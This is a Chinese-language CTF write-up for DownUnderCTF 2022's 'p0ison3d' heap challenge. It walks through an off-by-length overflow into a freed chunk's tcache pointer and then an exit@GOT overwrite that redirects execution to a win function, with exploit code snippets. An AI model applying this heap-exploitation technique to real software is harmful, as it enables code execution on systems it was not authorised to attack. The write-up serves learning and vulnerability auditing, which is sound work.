# DownUnderCTF 2022 p0ison3d Writeup

## 题目简述

程序最多管理三个 128 字节 note，支持新增、读取、编辑和删除。新增时分配 `malloc(128)`，但编辑时却调用：

```c
fgets(storage[index].data, 153, stdin);
```

这允许从 128 字节用户区继续写入相邻 chunk。题目使用 glibc 2.27，其 tcache freelist 尚无 safe-linking；二进制非 PIE，且 `exit@GOT` 可写，同时保留了执行 `system("cat ./flag.txt")` 的 `win` 函数。

## 解题过程

先连续分配三个同尺寸 chunk：

```python
add(0, b'aaaa')
add(1, b'bbbb')
add(2, b'cccc')
```

按 2、1 的顺序释放后，`0x90` 尺寸 tcache bin 的头部为 chunk 1，其 `fd` 指向 chunk 2：

```python
delete(2)
delete(1)  # tcache: chunk1 -> chunk2
```

note 0 仍然有效且物理上位于 chunk 1 之前。编辑 note 0 时，用 144 字节跨过自身 128 字节数据区和下一个 chunk 的 16 字节头部，随后 8 字节正好覆盖已释放 chunk 1 用户区开头的 tcache `fd`：

```python
edit(0, b'A' * 144 + p64(elf.got['exit']))
```

此时 freelist 变为 `chunk1 -> exit@GOT`。第一次再分配取回 chunk 1，第二次分配便把 `exit@GOT` 当作可用 chunk 返回；写入内容会落在 GOT 表项上：

```python
add(1, b'dddd')
add(2, p64(elf.sym['win']))
```

最后选择 Quit。程序原本调用 `exit(0)`，但 GOT 已改为 `win`，因此转而打印：

```text
DUCTF{w3lc0ME_tO_tH3_h3ap_4nd_h4PPy_TC4che_p01s0nIng}
```

## 方法总结

这是一条典型的相邻 chunk 溢出到 tcache freelist，再用两次同尺寸分配完成任意地址分配的链。利用成立依赖具体环境：glibc 2.27 没有 safe-linking，目标 GOT 可写，主程序地址固定。审计 note 类程序时，应逐项比较 add/edit 的真实长度，而不能只看分配尺寸是否统一。
